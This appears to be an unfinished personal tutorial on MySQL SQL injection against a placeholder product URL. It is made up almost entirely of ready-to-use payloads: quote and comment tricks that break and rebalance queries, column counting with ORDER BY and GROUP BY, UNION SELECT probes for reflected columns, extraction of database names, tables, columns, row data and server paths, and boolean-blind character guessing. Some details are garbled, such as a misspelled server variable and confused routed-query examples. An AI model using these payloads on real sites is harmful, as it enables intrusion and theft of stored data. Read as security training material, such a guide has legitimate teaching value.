# MySQL SQL Injection

#### Steps to perform SQL Injection.
1. Break the Query.
2. Fix/Balance the Query.
3. Get the total number of columns.
4. Get the vulnerable columns.
5. Exploit. (get the data from database)


### 1) Break the Query.
- let's say we have target https://website.com/product/id?=23 now, we want to test this URL for SQL Injection. So, as described in steps above, the very first thing we've to do is **Break the Query**.
- So, for breaking the query, we can use ``` ', ", `, . ```
 - example,
   - https://website.com/product/id?=23'
   - https://website.com/product/id?=23"
- after adding the ``` ', ", `, .```, you'll see error messages like, `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1` or any wired errors or maybe unusual behaviour in/on target website.

### 2) Fix the Query.
- after breaking the query, we've to fix the query. So, we can **balance** the **SQL QUERY**.
- So, for that we can use ``` --, --+, -- -, #, --#, ., -, /*, '), "), `), ')), ")),`)), '), ;%00 ```
- example,
   - https://website.com/product/id?=23' --
   - https://website.com/product/id?=23' --+
   - https://website.com/product/id?=23' -- -
   - https://website.com/product/id?=23' #
   - https://website.com/product/id?=23' --#
   - https://website.com/product/id?=23' /*
   - https://website.com/product/id?=.23' --+ (see the `.`)
   - https://website.com/product/id?=-23' --+ (see the `-`)
   - https://website.com/product/id?=-23') --+ (see the `-`)
   - etc. (*there are many ways to fix the query. at the time of wrting this, I forgot some of them. I'll add them If I came to know about it. till then, add your own variations to it.*)
 
### 3) Get the total number of columns.
- after balancing/fixing the query, we need to solve this question. **how many columns are there ?**
- So, to check the columns we can use ``` ORDER BY, GROUP BY, PROCEDURE ANALYSE() ```
- example,
   - https://website.com/product/id?=23' ORDER BY 5-- ERROR.
   - https://website.com/product/id?=23' ORDER BY 4-- ERROR.
   - https://website.com/product/id?=23' ORDER BY 3-- NO ERROR.
     - So, website has 3 columns.
   - https://website.com/product/id?=23' ORDER BY 1,2,3,4,5-- ERROR.
   - https://website.com/product/id?=23' ORDER BY 1,2,3,4-- ERROR.
   - https://website.com/product/id?=23' ORDER BY 1,2,3-- NO ERROR.
     - So, website has 3 columns.
   - https://website.com/product/id?=23' GROUP BY 5-- ERROR.
   - https://website.com/product/id?=23' GROUP BY 4-- ERROR.
   - https://website.com/product/id?=23' GROUP BY 3-- NO ERROR.
     - So, website has 3 columns.
   - https://website.com/product/id?=23' GROUP BY 1,2,3,4,5-- ERROR.
   - https://website.com/product/id?=23' GROUP BY 1,2,3,4-- ERROR.
   - https://website.com/product/id?=23' GROUP BY 1,2,3-- NO ERROR.
     - So, website has 3 columns.
   - https://website.com/product/id?=23' PROCEDURE ANALYSE()-- ERROR. (In this method, the website will act wiredly. So, keep closer look on website. ex. list random lists, paragraphs, errors, or something else, etc.)
     - Look at the website, if website lists random things let's say some 3 dots or whatever. then, confirm that, website has 3 columns.

### 4) Get the vulnerable columns.
- after getting the total number of columns, now it's time to find vulnerable columns, where we can try to place our pyloads strings to get the data from the database.
- So, to get the vulnerable columns, we can use ```UNION SELECT NULL or INT ``` or ```UNION ALL SELECT NULL or INT ```.
- add the NULL or INT value, total number of columns we get.
- example,
   - https://website.com/product/id?=23' UNION SELECT 1,2,3-- Because, we got the total 3 columns.
   - https://website.com/product/id?=23' UNION SELECT NULL,NULL,NULL--
   - https://website.com/product/id?=23' UNION ALL SELECT 1,2,3--
   - https://website.com/product/id?=23' UNION ALL SELECT NULL,NULL,NULL--
- now, in the case of `https://website.com/product/id?=23' UNION SELECT 1,2,3--`, you'll see a numbers been reflacted on the website. ex. 2,3. So, columns 2 & 3 is vulnerable.
- in case of NULL, we've to replace NULL by adding strings in each NULL value to get the vulnerable columns.
- example,
  - https://website.com/product/id?=23' UNION SELECT 'findVulClmn',NULL,NULL-- See, if `findVulClmn` been reflacted on website or not. if yes, then, congratulations, we've found vulnerable columns.
  - if not, go ahead and try, https://website.com/product/id?=23' UNION SELECT NULL, 'findVulClmn',NULL--.
  - try until you find some string being reflacted on website.

- **What if we didn't see any numbers been reflacted on website?**
 - So, in that case, we've to try other methods. such as, routed query, etc.
   - ***Routed Query***
     - So, in routed query injection technique, we do something like this,
       1. https://website.com/product/id?=23' UNION SELECT 1',2,3--
       2. https://website.com/product/id?=23' UNION SELECT 0x3127,2,3-- (**here 1' is 0xHEX-'0x3127' encoded.**)
         - now, put **0xHEX** encoded value on each column one after one and see the results. If, web page gets redirected or gets error or something strange happens in/on web page, then, assume that we can put our **routed query** in that column.
           - example,
             - if we get errors on 2nd column, (i.e. https://website.com/product/id?=23' UNION SELECT 1,0x3127,3--) then, we can perform our injection on that column like this,
             1. *Get the total number of columns:* https://website.com/product/id?=23' UNION SELECT 1,2' ORDER BY 10--,3-- ***(0xHEX the ORDER BY 10--)***
             2. *Get the vulnerable column:* https://website.com/product/id?=23' UNION SELECT 1,2' UNION SELECT 1,2,3,4,5--,3-- ***(0xHEX the UNION SELECT 1,2,3,4,5--)***
             3. now, you got the point. 🙂

### 5) Exploit. (get the data from database)
- So, after getting vulnerable columns, we can get the data from database by using various payloads.
- **get the version**
   - https://website.com/product/id?=23' UNION SELECT NULL,@@version,NULL--
   ```
   VERSION()
   @@GLOBAL.VERSION
   @@VERSION_COMMENT
   ```
   
- **get the database**
   - https://website.com/product/id?=23' UNION SELECT NULL,concat(schema_name), NULL FROM information_schema.schemata--
   ```
   SCHEMA()
   DATABASE()
   SELECT CONCAT(DB) FROM INFORMATION_SCHEMA.PROCESSLIST
   ```
- **get the tables**
  - https://website.com/product/id?=23' UNION SELECT NULL,concat(table_name), NULL FROM information_schema.tables WHERE table_schema='DATABASE'--
- **get the columns**
   - https://website.com/product/id?=23' UNION SELECT NULL,concat(column_name), NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'--
- **get the data**
   - https://website.com/product/id?=23' UNION SELECT NULL,concat(0x28,column_1,0x3a,column_2,0x29), NULL FROM TABLE_NAME--
- **get the user**
   - https://website.com/product/id?=23' UNION SELECT NULL,USER(),NULL--
   ```
   CURRENT_USER()
   SYSTEM_USER()
   SESSION_USER()
   SUBSTRING_INDEX(USER(),0x40,1)
   SELECT CONCAT(USER) FROM INFORMATION_SCHEMA.PROCESSLIST
   ```
 - **other**
   - SERVER OS : `@@VERSION_COMPILE_OS`
   - SERVER OS TYPE : `@@VERSION_COMPILE_MACHINE`
   - SQL BASE DIR : `@@BASEDIR`
   - SQL DATA DIR : `@@DATADIR`
   - PLUGIN DIR : `@@PULGIN_DIR`
   - HOSTNAME : `@@HOSTNAME`


## Blind MySQL SQL Injection
⚠️ Blind SQL Injection is very lengthy and tedious process.

### 1) Break the Query.
- follow the same methods as mentioned above.

### 2) Fix the Query.
- follow the same methods as mentioned above.

### 3) Check for the Blind SQL Injection.
- now, after fixing the query, it's time to check for the probability of blind sql injection whether it is possible or not.
- to check for blind sql injection we use something like this,
  - https://website.com/product/id?=23' or 1=0,
  - https://website.com/product/id?=23' or 1=1
  - https://website.com/product/id?=23' and 1=0,
  - https://website.com/product/id?=23' and 1=1
    - backend query look like this,
      - `SELECT product FROM stock WHERE ID = ‘23’ or 1=1;` <- returns true
      - `SELECT product FROM stock WHERE ID = ‘23’ or 1=0;` <- returns false
      - `SELECT product FROM stock WHERE ID = ‘23’ and 1=1;` <- returns true
      - `SELECT product FROM stock WHERE ID = ‘23’ and 1=0;` <- returns false
  - for example,
    1. if `or 1=0` breaks something on website or website act wiredly,
    2. now try `or 1=1`.
    3. now, if website gets back to it's normal stage, cogratulations, blind sql injection is possible. 🙂

### 4) Exploit. (get the data from database)
- yes, you heard it right. now, we're ready to exploit the database. no need to find total columns and vulnerable columns. 🙂
- but, this comes with it's own price. it's a tedious task. 😞

- **get the version**
  - let's suppose the version is `5.6.41-84.1`. (it's blind sql injection, we've to guess everything. 😃)
  - so, we can do like this,
    1. https://website.com/product/id?=23' and SUBSTRING(version(),1,1)=1
    2. here, `SUBSTRING(version(),1,1)=1` means, get the first letter of version.
     3. we used, SUBSTRING(version(),***1***,1)=***1***. means, is first letter of verssion is = to 1 or not? (`we ca use <,> as well`)
    4. SUBSTRING(version(),***1***,1)=***1*** <- see, if website is normal or not (means NO ERROR).
    5. if not, then try, 
       - SUBSTRING(version(),***1***,1)=***2***,
       - SUBSTRING(version(),***1***,1)=***3***,
       - SUBSTRING(version(),***1***,1)=***4***, etc..
    
    6. let's suppose, we got normal website on SUBSTRING(version(),***1***,1)=***5***, then we can confirm that first letter of the version is `5`.
    7. now, it's time to find rest of the numbers of version.
       - `ascii(SUBSTRING(version(),3,1))=54` (here we used `ASCII` function and `54` means `6`)
       - `left(version(),1)=5`
       - `right(version(),1)=1`
       - `right(left(version(),1),1)=5`
       - `(select mid(version(),8,1)=8)`


**Note:** not completed. to be continued...
